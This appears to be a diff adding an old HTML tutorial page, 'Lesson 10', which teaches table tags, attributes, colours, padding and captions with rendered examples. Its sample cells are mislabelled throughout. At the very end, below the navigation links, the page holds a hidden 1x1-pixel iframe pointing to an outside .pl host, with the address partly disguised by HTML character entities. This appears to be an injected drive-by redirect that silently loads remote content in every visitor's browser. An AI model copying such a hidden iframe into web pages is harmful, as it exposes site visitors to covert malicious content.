@@ -1,0 +1,156 @@
+<HTML>
+<HEAD>
+<TITLE>Lesson 10: Getting Down and Dirty with Tables</TITLE>
+</HEAD>
+
+<BODY>
+<H2>Lesson 10: Getting Down and Dirty with Tables</H2>
+
+Format, format, format. HTML is all about format. HTML is all about format. Just the other day, a friend asked me "Hey little v, is there a way to format a part of my page to look like it's a spreadsheet?" I told him "Heck yeah! Just make a table!".<p>
+
+Here's a little description of tables from a great book, HTML 4 Unleashed by Rick Darnell: "Tables are kind of like lists. We're introduced to them at an early age through the mirth of games such as tic-tac-toe and checkers. Later in life, someone forces us to use a spreadsheet, and suddenly tables are'nt so fun anymore...".<p>
+
+Tables were put in to HTML for the exact reason my friend wanted to use them for - spreadsheets and database information. Later, their features were expanded by developers to include attributes that allow much more than just that. Let's get started with creating a basic table, then get funky with some more advanced techniques!<p>
+
+So how do we start our own HTML spreadsheet? We use the &#60;TABLE&#62; tag!<p>
+
+The &#60;TABLE&#62; tag creates a blank table. It tells the browser "This is the start of a table". There is only one attribute to the &#60;TABLE&#62; tag that we need to worry now: the BORDER attribute. The BORDER attribute tells the browser how wide a border you want around your table data. If you do'nt include the the BORDER attribute into your &#60;TABLE&#62; tag, the browser automatically sets it to BORDER=0, which means there will be no border around your table data.<p>
+
+So our basic table with no data looks like this:<p>
+
+&#60;TABLE BORDER=1&#62;<BR>
+&#60;/TABLE&#62;<p>
+
+What do we have to do to get some data in there? Add cells of course! A <i>cell</i> is a rectangular part of a table that can hold text, HTML tags, and even images! Those of us who use spreadsheets are already familiar with cells. When we make <i>rows</i> and <i>columns</i> in our table, we divide our table into many cells.<p>
+
+To create a row in a table, we use the &#60;TR&#62;, or table row tag. To divide our row into columns, we use the &#60;TD&#62;, or table data tag. You place your cells information after the table data tag.<p>
+
+The HTML for a table with 3 rows and 3 columns is like this:<p>
+
+&#60;TABLE BORDER=1&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 1, Col 1 &#60;TD&#62;Row 1, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 2, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 3, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;/TABLE&#62;<p>
+
+And the table comes out looking like this:<p>
+
+<TABLE BORDER=1>
+<TR><TD>Row 1, Col 1 <TD>Row 1, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 2, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 3, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+</TABLE>
+<p>
+
+Need a little explanation for your table? Maybe a title for your column? Try a table header! The &#60;TH&#62; tag is used to put a bold header (or headers!) on the top row of your table. It's used like this:<p>
+
+&#60;TABLE BORDER=1&#62;<BR>
+&#60;TR&#62;&#60;TH&#62;9 Cell Table&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 1, Col 1 &#60;TD&#62;Row 1, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 2, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 3, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;/TABLE&#62;<p>
+
+And your browser shows it like so:<p>
+
+<TABLE BORDER=1>
+<TR><TH>9 Cell Table</TR>
+<TR><TD>Row 1, Col 1 <TD>Row 1, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 2, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 3, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+</TABLE>
+<p>
+
+We can change our table by using a variety of tags. Formatting a table combines parts of page format with image formatting.<p>
+
+Since we already know how to handle size in images, we can directly apply our knowledge to making tables. In our &lt;TABLE&gt; tag, we can add the WIDTH and HEIGHT attributes, just like in an image. For example, if we wanted a table 300 pixels wide and 300 pixels high, we'd code its &lt;TABLE&gt; tag like this:<p>
+
+&lt;TABLE WIDTH="300" HEIGHT="300"&gt;<p>
+
+We can also change the height and width of the individual cells by adding the HEIGHT and WIDTH attributes to the &lt;TD&gt; tags. Theres one other way to change our cells size though - we do this by passing the percentage of the table we want our cell to take up. For example, &lt;TD HEIGHT="50%" WIDTH="50%"&gt; makes that cell take up 50 percent of the tables total height and 50 percent of the tables total width.<p>
+
+Following this trend of similarities between images and tables, we can also align data in table in a similar fashion as an image. We just need to add the ALIGN or the VALIGN (vertical align) attributes to our &lt;TR&gt; tags. ALIGN can align our row to the "left", "right", or "center" and VALIGN can align our row to the "top", "middle" or "bottom". If we wanted a cell take up what would normally be a few different cells, we use the COLSPAN attribute. COLSPAN takes as an argument the number of cells that this cell should take up. If I wanted to get a little crazy, I might align a row like this:<p>
+
+&lt;TD ALIGN="right" VALIGN="bottom" COLSPAN="3"&gt;<p>
+
+And this would make a cell spanning 3 normal cells, and align our text in that cell to the bottom right portion of our row. How can COLSPAN and ALIGN improve our table? Take a look at our new, improved table and you'll see!<p>
+
+<TABLE BORDER=1>
+<TR ALIGN="center"><TH COLSPAN="3">9 Cell Table</TR>
+<TR><TD>Row 1, Col 1 <TD>Row 1, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 2, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 3, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+</TABLE>
+<p>
+
+As you can see, centering our top heading made our table look just a little better. <p>
+
+Does it get any better than this? Of course! We can give our whole table - or even individual rows or cells - their own background color. Can you guess how (heres a hint - remember how formatting a table is like formatting a page)? If you guessed "Use the BGCOLOR or BACKGROUND attributes" you're right! Do'nt be discouraged - you just learned how! These attributes are just inserted exactly as they would be in the &#60;BODY&#62; tag. So if i wanted the background of my sample table to be blue, and the top row to be red, I would just change the code to look like this:<p>
+
+&#60;TABLE BGCOLOR="blue" BORDER=1&#62;<BR>
+&#60;TR BGCOLOR="red" ALIGN="center"&#62;&#60;TH COLSPAN="3"&#62;9 Cell Table&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 1, Col 1 &#60;TD&#62;Row 1, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 2, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 3, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;/TABLE&#62;<p>
+
+And if we take another look it comes out like this:<p>
+
+<TABLE BGCOLOR="blue" BORDER=1>
+<TR BGCOLOR="red" ALIGN="center"><TH COLSPAN="3">9 Cell Table</TR>
+<TR><TD>Row 1, Col 1 <TD>Row 1, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 2, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 3, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+</TABLE>
+<p>
+
+Notice that space is a little tight in those cells? Looks like we gotta add a little space between the borders and the text. How is this done you ask? We need to set the CELLSPACING and CELLPADDING in our table! The CELLSPACING attribute sets the amount of space between cells in our table, in pixels. The CELLPADDING attribute is used to set the amount of space between the cell borders and the cell data. If we add CELLPADDING="0" to our table, it makes the table's data align as closely as possible to the borders. Got it? Let's update our table!<p>
+
+&#60;TABLE BGCOLOR="blue" BORDER=1 CELLSPACING=5 CELLPADDING=10&#62;<BR>
+&#60;TR BGCOLOR="red" ALIGN="center"&#62;&#60;TH COLSPAN="3"&#62;9 Cell Table&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 1, Col 1 &#60;TD&#62;Row 1, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 2, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 3, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;/TABLE&#62;<p>
+
+Yields this result:<p>
+
+<TABLE BGCOLOR="blue" BORDER=1 CELLSPACING=5 CELLPADDING=10>
+<TR BGCOLOR="red" ALIGN="center"><TH COLSPAN="3">9 Cell Table</TR>
+<TR><TD>Row 1, Col 1 <TD>Row 1, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 2, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 3, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+</TABLE>
+<p>
+
+Let's say we want our table to have a little caption that identifies what it is. We can do this by adding a &#60;CAPTION&#62; to our table. It's use is pretty simple, so i'll just show you how it's done.<p>
+
+&#60;TABLE BGCOLOR="blue" BORDER=1 CELLSPACING=5 CELLPADDING=10&#62;<BR>
+&#60;CAPTION&#62;A sample table&#60;/CAPTION&#62;
+&#60;TR BGCOLOR="red" ALIGN="center"&#62;&#60;TH COLSPAN="3"&#62;9 Cell Table&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 1, Col 1 &#60;TD&#62;Row 1, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 2, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;TR&#62;&#60;TD&#62;Row 3, Col 1 &#60;TD&#62;Row 2, Col 2 &#60;TD&#62;Row 3, Col 3&#60;/TR&#62;<BR>
+&#60;/TABLE&#62;<p>
+
+Makes our table look like so:<p>
+
+<TABLE BGCOLOR="blue" BORDER=1 CELLSPACING=5 CELLPADDING=10>
+<CAPTION>A sample table</CAPTION>
+<TR BGCOLOR="red" ALIGN="center"><TH COLSPAN="3">9 Cell Table</TR>
+<TR><TD>Row 1, Col 1 <TD>Row 1, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 2, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+<TR><TD>Row 3, Col 1 <TD>Row 2, Col 2 <TD>Row 3, Col 3</TR>
+</TABLE>
+<p>
+
+Captions are great if you need to say "This is my table" or something along that line, but are completely optional.<p>
+
+Is your head spinning with all the information? Here's a few things to help you regain your senses:<BR><OL>
+<LI> Mail me at <A HREF="mailto:little_vAyour-house.com">little_v@your-house.com</A> with any questions.
+<LI> <A HREF="lesson11.html">Go on to the next lesson!</A><p>
+
+<A HREF="../main3.html">Back to Blacksun's Mainpage</A>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
